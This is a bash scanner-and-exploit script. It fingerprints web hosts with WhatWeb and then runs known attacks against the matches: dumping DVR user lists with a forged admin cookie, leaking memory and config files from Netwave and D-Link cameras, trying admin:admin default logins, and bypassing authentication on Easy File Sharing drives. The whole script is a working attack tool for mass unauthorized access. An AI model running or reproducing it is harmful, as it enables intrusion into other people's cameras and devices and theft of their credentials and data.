#!/bin/bash

# WAIT_COMMAND="nc -z -w3 localhost 8091" ## For later use with https://www.securityfocus.com/archive/1/518123

CHECK=`./WhatWeb/whatweb --no-errors -U='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36' $1`
#### Cam checks ####
if [[ $CHECK =~ "VR Login" ]]; then #DVR vuln
	DATA=`curl -sL -w "%{http_code}\\n" "http://$1/device.rsp?opt=user&cmd=list" -o /dev/null`
	if [[ $DATA == "200" ]]; then
		echo -e "\e[1;49;93m_-_-_-\e[0;49;96m $1 + DVR \e[1;49;93m-_-_-_\e[0m"
		curl "http://$1/device.rsp?opt=user&cmd=list" -H "Cookie: uid=admin"
	fi
elif [[ $CHECK =~ "netwave" ]]; then #Netwave IP cam leak
	echo -e "\e[1;49;93m_-_-_-\e[0;49;96m $1 + Netwave \e[1;49;93m-_-_-_\e[0m"
	echo 'RAM Check:'
	wget -qO- http://$1//proc/kcore | strings #RAM leak 01
	echo 'Driver check:'
	wget -qO- http://$1//etc/RT2870STA.dat #Driver leak 01
	echo 'r0m check:'
	wget -qO- http://$1//dev/rom0
	echo 'Status check:'
	wget -qO- http://$1/get_status.cgi
elif [[ $CHECK =~ "DCS-930L|DCS-932L" ]]; then #DLink Cam Exploit
	echo -e "\e[1;49;93m_-_-_-\e[0;49;96m $1 + Dlink-CAM \e[1;49;93m-_-_-_\e[0m"
	echo 'Config:'
	curl -U 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36' "http://$i/frame/GetConfig"
elif [[ $CHECK =~ "Title[Login]" ]]; then
	DATA=`curl -u admin:admin -sL -w "%{http_code}\\n" "http://$1/" -o /dev/null`
	if [[ $DATA =~ "302|200" ]]; then
		echo -e "\e[1;49;93m_-_-_-\e[0;49;96m $1 + POS-MayGion-CAM \e[1;49;93m-_-_-_\e[0m"
		echo "[+] http://admin:admin@$1/"
	fi
#### File grab check ####
elif [[ $CHECK =~ "Easy File Sharing" ]]; then 
	echo -e "\e[1;49;93m_-_-_-\e[0;49;96m $1 + EFS \e[1;49;93m-_-_-_\e[0m"
	echo "Drive check:"
	for efs_alp in {a..z}; do
		DATA=`curl -sL -w "%{http_code}\\n" "http://$1/disk_$efs_alp/" -o /dev/null` #Easy File Sharing auth bypass
		if [[ $DATA == "200" ]]; then
			echo "[+] http://$1/disk_$efs_alp/"
		fi
	done
elif [[ $CHECK =~ "Index of " ]]; then
	echo -e "\e[1;49;93m_-_-_-\e[0;49;96m $1 + OpenDir \e[1;49;93m-_-_-_\e[0m"
	curl -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36' -s "http://$1/" | sed -nr 's/(.*)href="?([^ ">]*).*/\2\n\1/; T; P; D;'
#### 401 check ####
elif [[ $CHECK =~ "401 Unauthorized" ]]; then
	echo -e "\e[1;49;93m_-_-_-\e[0;49;96m $1 + 401 \e[1;49;93m-_-_-_\e[0m"
	echo "Saved to 403s.txt"
	echo "$1" >> 403s.txt
fi